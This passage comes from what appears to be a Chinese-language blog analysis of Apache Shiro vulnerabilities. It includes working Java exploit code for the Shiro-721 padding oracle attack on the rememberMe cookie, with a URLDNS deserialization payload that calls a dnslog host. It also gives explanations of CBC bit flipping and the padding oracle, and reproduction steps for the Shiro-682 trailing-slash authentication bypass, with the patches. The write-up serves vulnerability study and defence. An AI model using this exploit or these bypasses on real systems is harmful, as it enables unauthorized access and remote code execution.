&#125;</span><br><span class="line">                paddingOracle[i]++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                updatePaddingOracle(i, intermediateBytes, paddingOracle);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] cn = <span class="keyword">new</span> <span class="title class_">byte</span>[BLOCK_SIZE];</span><br><span class="line">        <span class="type">byte</span>[] payloadBlock = getBlock(n + <span class="number">1</span>, evilCode);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; BLOCK_SIZE; k++) &#123;</span><br><span class="line">            cn[k] = (<span class="type">byte</span>) (payloadBlock[k] ^ intermediateBytes[k]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updatePaddingOracle</span><span class="params">(<span class="type">int</span> index, <span class="type">byte</span>[] intermediateBytes, <span class="type">byte</span>[] paddingOracle)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> index; k &lt; BLOCK_SIZE; k++) &#123;</span><br><span class="line">            paddingOracle[k] = (<span class="type">byte</span>) ((BLOCK_SIZE - index + <span class="number">1</span>) ^ intermediateBytes[k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] obtainValidData(String url, String username, String password) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> executeLoginRequest(url, username, password)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">setCookie</span> <span class="operator">=</span> getSetCookieHeader(response);</span><br><span class="line">            <span class="keyword">return</span> extractRememberMeValue(setCookie);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CloseableHttpResponse <span class="title function_">executeLoginRequest</span><span class="params">(String url, String username, String password)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(url);</span><br><span class="line">        List&lt;NameValuePair&gt; params = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;username&quot;</span>, username));</span><br><span class="line">        params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;password&quot;</span>, password));</span><br><span class="line">        params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&quot;true&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;submit&quot;</span>, <span class="string">&quot;Login&quot;</span>));</span><br><span class="line">        httpPost.setEntity(<span class="keyword">new</span> <span class="title class_">UrlEncodedFormEntity</span>(params, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> HTTP_CLIENT.execute(httpPost);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getSetCookieHeader</span><span class="params">(CloseableHttpResponse response)</span> &#123;</span><br><span class="line">        Header[] headers = response.getHeaders(<span class="string">&quot;Set-Cookie&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Header header : headers) &#123;</span><br><span class="line">            String[] cookies = header.getValue().split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String cookie : cookies) &#123;</span><br><span class="line">                String[] pair = cookie.trim().split(<span class="string">&quot;=&quot;</span>, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (pair.length == <span class="number">2</span> &amp;&amp; pair[<span class="number">0</span>].equals(<span class="string">&quot;rememberMe&quot;</span>) &amp;&amp; !pair[<span class="number">1</span>].equals(<span class="string">&quot;deleteMe&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> pair[<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] extractRememberMeValue(String cookie) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cookie != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> cookie;</span><br><span class="line">            <span class="keyword">return</span> Base64.decode(base64);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBlock(<span class="type">int</span> blockIndex, <span class="type">byte</span>[] byteStream) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> (blockIndex - <span class="number">1</span>) * BLOCK_SIZE;</span><br><span class="line">        <span class="keyword">if</span> (startIndex &lt; <span class="number">0</span> || startIndex &gt;= byteStream.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Math.min(BLOCK_SIZE, byteStream.length - startIndex);</span><br><span class="line">        <span class="type">byte</span>[] block = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">        System.arraycopy(byteStream, startIndex, block, <span class="number">0</span>, length);</span><br><span class="line">        <span class="keyword">return</span> block;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] concatenateArrays(<span class="type">byte</span>[] array1, <span class="type">byte</span>[] array2) &#123;</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[array1.length + array2.length];</span><br><span class="line">        System.arraycopy(array1, <span class="number">0</span>, result, <span class="number">0</span>, array1.length);</span><br><span class="line">        System.arraycopy(array2, <span class="number">0</span>, result, array1.length, array2.length);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilCode(String dnslog) <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(dnslog);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; aClass = url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">1</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105531023.png" alt="image-20241126105531023"></p>
<p>将获取的数据作为Cookie的rememberMe值：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105638803.png" alt="image-20241126105638803"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126105727729.png" alt="image-20241126105727729"></p>
<h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h5><p>CBC字节翻转攻击是一种利用CBC（Cipher Block Chaining）加密模式特性的攻击方式。在CBC模式中，密文块之间的依赖关系允许攻击者通过修改初始向量iv或密文中的特定字节，来操控解密后的明文内容。我们先来介绍CBC加密模式。</p>
<h6 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h6><p>CBC（Cipher Block Chaining，密码块链接）是一种对称加密模式。它通过将每个明文块与前一个密文块进行链接，增强了加密的安全性。</p>
<p>这是一个CBC加密过程：</p>
<p>我们会将明文进行分组划分，对每个组都调用加密算法。但是在明文块加密之前，会先与上一组的密文块(明文块的加密结果)进行异或，然后将异或的结果用加密算法加密。对于第一个明文块由于没有上一个密文块，会有一个初始向量IV来对它进行异或。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/1.png" alt="1"></p>
<p>数学公式：<br>$$<br>\begin{equation}<br>\begin{aligned}<br>C_0 &#x3D; E_k(P_0 \oplus IV) \<br>C_1 &#x3D; E_k(P_1 \oplus C_0) \<br>C_2 &#x3D; E_k(P_2 \oplus C_1) \<br>……………..<br>\end{aligned}<br>\end{equation}<br>$$<br>解密过程则相反，第一组密文块解密之后与初始向量IV异或得到明文块，后续密文块的解密结果与上一个密文块进行异或得到明文块。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/2.png" alt="2"></p>
<p>数学公式：<br>$$<br>\begin{equation}<br>\begin{aligned}<br>P_0 &#x3D; D_k(C_0) \oplus IV\<br>P_1 &#x3D; D_k(C_1) \oplus C_0\<br>P_2 &#x3D; D_k(C_2) \oplus C_1\<br>……………..<br>\end{aligned}<br>\end{equation}<br>$$</p>
<h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>从上面知道了CBC模式解密时，该组密文用解密算法解密后得到的值，需要与上一组的密文异或才能得到明文，第一组则是需要与初始向量IV异或。</p>
<p>假设攻击者能够控制传输中的密文，并希望改变解密后某个明文块的特定字节：</p>
<ol start="8">
<li>攻击者修改密文块 $C_{i-1}$ 中的某些字节。</li>
<li>由于明文块 $P_i$的生成与 $C_{i-1}$ 有关，攻击者可以通过改变 $C_{i-1}$ ，操控解密时 $P_i$ 的特定字节。</li>
</ol>
<p>举一个例子，假设我们有以下明文块（每块8字节）：</p>
<ul>
<li>$P_0$: <code>admin=fa</code></li>
<li>$P_1$:<code> lse.....</code></li>
</ul>
<p>CBC模式加密后的密文块：</p>
<ul>
<li>$C_0 &#x3D; E_k(P_0 \oplus IV)$</li>
<li>$C_1 &#x3D; E_k(P_1 \oplus C_0)$</li>
</ul>
<ol start="10">
<li><p><strong>修改密文块</strong>: 假设攻击者可以获取密文，并有可能对其进行修改。攻击者的目标是通过修改密文，让解密后的明文成为 <code>admin=true</code>。</p>
</li>
<li><p><strong>比特翻转</strong>: 攻击者关注的密文块是 $C_0$，因为它影响 $P_1$ 的解密结果。假设 $P_1$ 的某个字节对应 $f$ 的ASCII编码（102），攻击者可以翻转任意一个比特来改变其值以透露不同的字符，在这种情况下想要达到 $t$（ASCII编码116）。</p>
</li>
</ol>
<p>   通过计算：<br>$$<br>   116_{10} &#x3D; 102_{10} \oplus x<br>$$<br>   这里 (x) 是攻击者需要翻转的比特模式，通过计算得出：<br>$$<br>   x &#x3D; 116 \oplus 102 &#x3D; 18<br>$$<br>   攻击者修改 $C_0$ 中相应的字节，将其异或18，就可以将 $P_1$ 中的 $f$ 改为 $t$。整个详细的推导过程很简单，可以自行推导一下。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241126165747906.png" alt="image-20241126165747906"></p>
<h5 id="填充算法"><a href="#填充算法" class="headerlink" title="填充算法"></a>填充算法</h5><p>常见的对称加密算法一般分组加密，将明文按照规定的bit位数划分为一个个的明文块。然后用加密算法对每个明文块加密，经过不同的工作模式处理得到密文。下面介绍Shiro使用的PKCS#7，</p>
<h6 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS#7"></a>PKCS#7</h6><ul>
<li><p>在填充时，所有填充值的字节被设为填充字节数的值。例如，如果需要填充4个字节，那么每个填充值都是<code>0x04</code>。</p>
</li>
<li><p>例子：如果块大小是8字节，明文是<code>&quot;HELLO&quot;</code>（5字节），则填充后的结果是<code>&quot;HELLO\x03\x03\x03&quot;</code>。</p>
<p>下面是在翻阅文章见过很多的一张图，也可以直观看出填充算法是如何填充的：</p>
</li>
</ul>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127035007553.png" alt="image-20241127035007553"></p>
<p>下面内容来自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45264425/article/details/127096145">PKCS#1、PKCS#5、PKCS#7、PKCS#8到底是什么？_pkcs1-CSDN博客</a></p>
<blockquote>
<p>PKCS7<br>PKCS7与PKCS5的区别在于PKCS5只填充到8字节，而PKCS7可以在1-255之间任意填充。<br>简单地说, PKCS5, PKCS7和SSL3, 以及CMS(Cryptographic Message Syntax)<br>注意：<br>当只讨论了 8字节(64位) 块的加密, 对其他块大小没有做说明，其PKCS5填充算法跟 PKCS7是一样的。<br>但是后来 AES 等算法, 把BlockSize扩充到 16个字节。因为AES并没有64位的块, 如果采用PKCS5, 那么实质上就是采用PKCS7。<br>理解：<br>PKCS#5填充是PKCS#7填充的一个子集，在PKCS#7填充时BlockSize为8的时候，PKCS#5与PKCS#7填充是一样的，<br>在BlockSize不同时PKCS#5与PKCS#7填充是不同的，PKCS#5填充是将数据填充到8的倍数，填充后数据长度的计算公式是<br>定于元数据长度为x， 填充后的长度是 x + (8 - (x % 8)), 填充的数据是 8 - (x % 8)<br>因此所以，PKCS#5可以向上转换为PKCS#7，但是PKCS#7不一定可以转换到PKCS#5（用PKCS#7填充加密的密文，用PKCS#5解出来是错误的）。<br>所以现在有些算法写的是PKCS#5，但是输出的确实PKCS#7。</p>
</blockquote>
<p>因此虽然源码中使用PKCS5Padding检测填充的规范性，但是不要被类名迷惑了，实际填充算法还是PKCS#7。</p>
<h5 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h5><p> Padding Oracle Attack是一种针对使用填充模式的加密协议的攻击，尤其在对称加密算法中，比如AES的CBC模式。当使用这些模式进行加密时，明文需要被填充到适合块大小的长度。在解密过程中，如果填充不正确，应用程序可能会返回一个错误信息。Padding Oracle Attack利用这一特性，通过观察应用程序是否返回填充错误来推测加密数据的内容。</p>
<p>所以该 Padding Oracle Attack需要的条件：</p>
<ol start="12">
<li>攻击者知道并且能控制密文以及初始向量IV。</li>
<li>可以通过发送密文触发解密过程，并且解密过程中填充不正确时，系统需要返回一个特定的错误或者区别于填充正确的标记。</li>
</ol>
<p>举一个很多文章出现的场景，由于此图片出现很多文章中，所以并未找到出处。</p>
<p>这是一段密文的解密过程，我们发送密文<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code>给服务器进行一个认证。（一般IV是携带发送的，作为密文块的前缀）服务器会去解密该密文。因此会有下面情况：</p>
<ul>
<li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li>
<li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li>
<li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li>
</ul>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127043650182.png" alt="image-20241127043650182"></p>
<ul>
<li><p><code>Encrypted Input</code>：输入的密文</p>
</li>
<li><p><code>Intermediary Value</code>：计算的中间值</p>
</li>
<li><p><code>Initialization Vector</code>：初始化向量</p>
</li>
<li><p><code>Plain-Text(Padded)/Decrypted Value</code>：解密出的明文</p>
</li>
</ul>
<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><p>我们作为发送方，根据密文知道的是如下信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">初始化向量： 7B  21  6A  63  49  51  17  0F</span><br><span class="line">第一组密文： F8  51  D6  CC  68  FC  95  37</span><br><span class="line">第二组密文： 85  87  95  A2  8E  D4  AA  C6</span><br></pre></td></tr></table></figure>

<p>尝试破解第一组密文，将初始化向量设为0，即0000000000000000F851D6CC68FC9537，此时会解密失败，服务器也会返回请求异常或错误。因为解密出来的值不符合PKCS#7。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127052835569.png" alt="image-20241127052835569"></p>
<p>爆破IV的最后一个字节，直到其为0x3C时，也就是发送数据是0000000000000066F851D6CC68FC9537时，解密的值为0x01，符合PKCS#7，此时服务器会正常返回。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127052857394.png" alt="image-20241127052857394"></p>
<p>从两次与服务器交互，因为解密异常造成返回的差异可以知道：<br>$$<br> 0x3C\oplus对应字节位的中间值&#x3D;0x01<br>$$<br>可以计算出该中间值为0x3D，因此可以确定一个中间值了，而中间值是不会变的，因为我们的密文不变。我们可以重复上面的操作，比如假设解出来的明文最后两位是0x02，符合PKCS#7，因此有下面式子：<br>$$<br>0x3D\oplus IV对应的字节位&#x3D;0x02\<br>0x26\oplus对应字节位的中间值&#x3D;0x02<br>$$<br>此时我们又可以接触一位中间值为0x2E。</p>
<p>重复该过程，直到假设的明文值为0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 ：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127054427712.png" alt="image-20241127054427712"></p>
<p>此时就得到了该组所有中间值，将其与初始向量IV异或即可得到真正的明文。并且我们获取了中间值，可以构造IV来达到解密出想要的明文效果，因为明文是中间值与IV异或得来的。</p>
<p>对于多组加密，需要从最后一组，构造出IV，然后把构造的IV作为上一组的密文，重复上述流程，得到中间值，继续根据想要解密出的明文构造IV，然后重复该做法即可。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241127055429864.png" alt="image-20241127055429864"></p>
<h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据前置知识的学习，配合POC源码，大概就可以懂该漏洞的原理了。</p>
<p>首先通过发送登录请求获取接下来交互所需的Cookie，也就是AES-CBC加密的密文。然后通过前置知识中提到的攻击方法，爆破篡改密文，使得解密出来的明文是我们序列化数据。</p>
<p>和CVE-2016-4437(Shiro-550反序列化漏洞)一样我们直接在CookieRememberMeManager#getRememberedSerializedIdentity打上断点。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128023012576.png" alt="image-20241128023012576"></p>
<p>获取Cookie之后去用ensurePadding方法确认数据的填充，然后Base64解码返回给上去。然后调用AbstractRememberMeManager#convertBytesToPrincipals函数，一路往下调用解封装和检查。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128030514989.png" alt="image-20241128030514989"></p>
<p>PKCS5Padding#unpad方法检测填充是否符合要求，不符合就返回-1，然后向上抛异常，直到回到AbstractRememberMeManager#onRememberedPrincipalFailure，会去把cookie设置为deleteMe。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241128030951980.png" alt="image-20241128030951980"></p>
<p>后续过程其实和shiro550差不多，解密的数据拿去反序列化。</p>
<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241129014025229.png" alt="image-20241129014025229"></p>
<p>直接用AES-CBC加密模式换成了AES-GCM加密模式。因为攻击是基于AES-CBC加密模式的漏洞攻击的。</p>
<h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/833582b2f560">Padding Oracle Attack(填充提示攻击)详解及验证 - 简书</a></p>
<p><a target="_blank" rel="noopener" href="https://www.infosecinstitute.com/resources/vulnerabilities/padding-oracle-attack-2/">Padding oracle attack | Infosec</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析 - 枫のBlog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.infosecinstitute.com/resources/hacking/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attack—101 approach | Infosec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/163756.html">CBC字节翻转攻击测试 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/09/17/%E6%B5%85%E6%9E%90CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8EPadding-Oracle-Attack/">浅析CBC字节翻转攻击与Padding Oracle Attack [ Mi1k7ea ]</a></p>
<h3 id="Shiro-682"><a href="#Shiro-682" class="headerlink" title="Shiro-682"></a>Shiro-682</h3><p>没有具体的CVE编号，是一个Apache Shiro 项目的一个问题报告。报告链接：<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">[SHIRO-682] fix the potential threat when use “uri &#x3D; uri + ‘&#x2F;‘ “ to bypassed shiro protect - ASF JIRA</a></p>
<h4 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.5.0</code></p>
<p>漏洞成因：在 Spring Web 环境中，访问 URI <code>/resource/menus</code> 和 <code>/resource/menus/</code> 都可以访问相同的资源，但 Shiro 的路径模式匹配机制未能正确处理这两种情况。导致用户可以通过在请求 URI 后添加 <code>/</code> 来绕过 Shiro 的过滤器。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/pull/127/commits/e61a29cd6ad4724cf9d85c463103c01f6bafdc44">[SHIRO-682] fix the potential threat when use “uri &#x3D; uri + ‘&#x2F;‘ “ to bypassed shi… by tomsun28 · Pull Request #127 · apache&#x2F;shiro</a></p>
<h4 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>正常访问需要权限的页面&#x2F;Shiro682，会302跳转到登录页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203024552726.png" alt="image-20241203024552726"></p>
<p>如果在访问url后加一个<code>/</code>，即访问&#x2F;Shiro682&#x2F;，可以无需权限访问。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203024620561.png" alt="image-20241203024620561"></p>
<h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Shiro对于url的处理前面已经提到过了。通过在PathMatchingFilterChainResolver#getChain方法中，会去调用getPathWithinApplication方法从request请求中获取请求URI，得到的是&#x2F;Shiro682&#x2F;。而我们设置的需要鉴权的URI是&#x2F;Shiro682。而因为请求URI后多一个斜杠，所以无法匹配上，因此不会进过Shiro过滤器。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203025016956.png" alt="image-20241203025016956"></p>
<p>对于spring的URI处理，会发现它将&#x2F;Shiro682&#x2F;和&#x2F;Shiro682匹配上，因此spring会认为&#x2F;Shiro682&#x2F;访问的就是&#x2F;Shiro682。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203030601370.png" alt="image-20241203030601370"></p>
<p>对于&#x2F;admin.html这种访问资源的方法同样有效，会匹配到&#x2F;** 上，后续会将admin.html取出来，再去resources目录下寻找该资源。具体流程可以自行调试。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203032113622.png" alt="image-20241203032113622"></p>
<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在<code>PathMatchingFilter</code>和<code>PathMatchingFilterChainResolver</code>设置了一个默认路径分隔符<code>DEFAULT_PATH_SEPARATOR</code>，即为<code>/</code>，如果路径以此结尾，会截取掉。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203234429920.png" alt="image-20241203234429920"><br><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241203234447535.png" alt="image-20241203234447535"></p>
<h3 id="CVE-2020-1957-Shiro-682的绕过"><a href="#CVE-2020-1957-Shiro-682的绕过" class="headerlink" title="CVE-2020-1957(Shiro-682的绕过)"></a>CVE-2020-1957(Shiro-682的绕过)</h3><blockquote>
<p>Apache Shiro before 1.5.2, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.</p>
</blockquote>
<h4 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.5.2</code></p>
<p>漏洞成因： <code>Shiro</code> 和 <code>Spring</code> 对 <code>URL</code> 的处理的差异化。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Add tests for WebUtils · apache&#x2F;shiro@3708d79</a></p>
<h4 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>注意我这里的SprintBoot版本是<code>2.1.5.RELEASE</code>，网上常见的POC，即<code>/xxx/../admin</code>，在版本较高的SprintBoot中会返回报错页面。测试发现<code>2.3.12.RELEASE</code>不行，而<code>2.1.5.RELEASE</code>可以。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span 